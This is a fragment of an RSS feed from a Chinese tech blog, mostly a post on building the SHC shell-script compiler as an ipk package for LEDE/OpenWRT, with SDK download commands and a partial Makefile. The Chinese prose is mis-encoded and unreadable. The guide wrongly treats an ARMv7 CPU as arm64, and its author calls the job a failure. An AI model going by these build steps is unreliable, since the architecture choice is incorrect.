&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;to bond multiple 4g lte modems or wifi connectios and stitch them back together  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;on server side to stream video feeds. the connection must be stable and have  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;the maximum available bandwidth with no drop in some connection drops.  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;simillar to service called SPEEDIFY &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;but it doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t work well&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;this can be also achieved by splitting video packets and send them through  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; different links and stitch the video packets back on the server side.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç®€å•è¯´ï¼Œå¾ˆå¯èƒ½å®ƒè¿™è¾¹æ˜¯ä¸ªåµŒå…¥å¼ç³»ç»Ÿï¼Œæ ‘è“æ´¾ã€nanopiä¹‹æµçš„ï¼Œæ¥äº†4Gçš„æ— çº¿ä¸Šç½‘å¡ï¼Œæƒ³å»èšåˆé“¾è·¯ä¸Šä¼ æµåª’ä½“ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹å…­Compile an ipk file on Lede (OpenWRT)</title>
      <link>https://rendoumi.com/posts/20240124_freelancer_6/</link>
      <pubDate>Wed, 24 Jan 2024 10:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124_freelancer_6/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸€æ¬¡å¤±è´¥çš„ä»»åŠ¡ï¼Œå³ä½¿å†æ¥ä¸€æ¬¡ï¼Œä¾ç„¶ä¼šå¤±è´¥ï¼Œå› ä¸ºæ— æ³•éªŒè¯ï¼ŒçœŸå¤Ÿshitçš„ï¼Œæ‰£äº†æˆ‘10$çš„æ‰‹ç»­è´¹ã€‚&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹ï¼Œä»¥å„†æ•ˆå°¤ã€‚&lt;/p&gt;
&lt;p&gt;ä»»åŠ¡å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job would be to compile an ipk file of SHC that would work with LEDE OS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;openwrt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; and the processor used in our system - will provide details
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;I think you must have a &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; bit system to use the SDK to compile the file  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¿»è¯‘ä¸€ä¸‹ï¼šåœ¨OpenWRTå¹³å°ä¸‹ç¼–è¯‘ä¸€ä¸ªSHCï¼Œå¹¶ä¸”èƒ½å·¥ä½œã€‚&lt;/p&gt;
&lt;p&gt;å®Œå…¨æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;How to compile SHC on LEDE:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tested build environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS: Ubuntu 14.04.5 LTS  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CPU: ARMv7 Processor rev &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v7l&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Before you begin, check your system is updated, i.e.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get upgrade  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get autoremove
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Step-by-step manual:  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Note: perform all steps as regular &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;non-root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; user. User must be in sudo group.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. Update your sources
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. Install nesessary packages:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. Get latest LEDE &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; from git repository  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4. No Need to Update and install all LEDE packages  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   We just want to compile shc, not other packages , so don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t update.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;5. Run &amp;#39;&lt;/span&gt;make menuconfig&lt;span class=&#34;s1&#34;&gt;&amp;#39; (Just Save and Exit)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;6. Get SHC sources to LEDE package tree  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt; (we are and shc-3.8.9b.tgz is in source directory)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mkdir -p package/shc/src  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;tar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;7. Make ipk Makefile
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;vi package/shc/Makefile  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;##############################################
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# OpenWrt Makefile for shc program
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# Most of the variables used here are defined in
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# the include directives below. We just need to 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# specify a basic description of the package, 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# where to build our program, where to find 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# the source files, and where to install the 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# compiled program on the router. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# Be very careful of spacing in this file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# Indents should be tabs, not spaces, and 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# there should be no trailing whitespace in
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# lines that are not commented.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;##############################################
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;include $(TOPDIR)/rules.mk
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# Name and release number of this package
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;PKG_NAME:=shc  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;PKG_VERSION:=3.8.9b  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;PKG_MAINTAINER:=Francisco, Rosales, &amp;lt;frosal@fi.upm.es&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# This specifies the directory where we&amp;#39;&lt;/span&gt;re going to build the program.  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# The root build directory, $(BUILD_DIR), is by default the build_mipsel &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# directory in your OpenWrt SDK directory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PKG_BUILD_DIR :&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;BUILD_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;/&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_NAME&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;INCLUDE_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;/package.mk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Specify package information for this program. &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# The variables defined here should be self explanatory.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# If you are running Kamikaze, delete the DESCRIPTION &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# variable below and uncomment the Kamikaze define&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# directive for the description below&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;define Package/&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_NAME&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SECTION:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utils
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    CATEGORY:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Utilities
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    TITLE:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; shc ---- This tool generates a stripped binary executable version of the script specified at &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; line.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    URL:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://www.datsi.fi.upm.es/~frosal
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;endef
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Uncomment portion below for Kamikaze and delete DESCRIPTION variable above&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;define Package/&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_NAME&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;/description  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    shc ---- This tool generates a stripped binary executable version
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        of the script specified at &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; line.&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;endef
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# Specify what needs to be done to prepare for building the package.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# In our case, we need to copy the source files to the build directory.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# This is NOT the default.  The default uses the PKG_SOURCE_URL and the
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# PKG_SOURCE which is not defined here to download the source from the web.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# In order to just build a simple program that we have just written, it is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# much easier to do it this way.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;define Build/Prepare  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    mkdir -p &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_BUILD_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;CP&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ./src/* &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_BUILD_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;endef
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# We do not need to define Build/Configure or Build/Compile directives
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# The defaults are appropriate for compiling a simple program such as this one
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# Specify where and how to install the program. Since we only have one file, 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# the helloworld executable, install it by copying it to the /bin directory on
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# the router. The &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;1&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; variable represents the root directory on the router running 
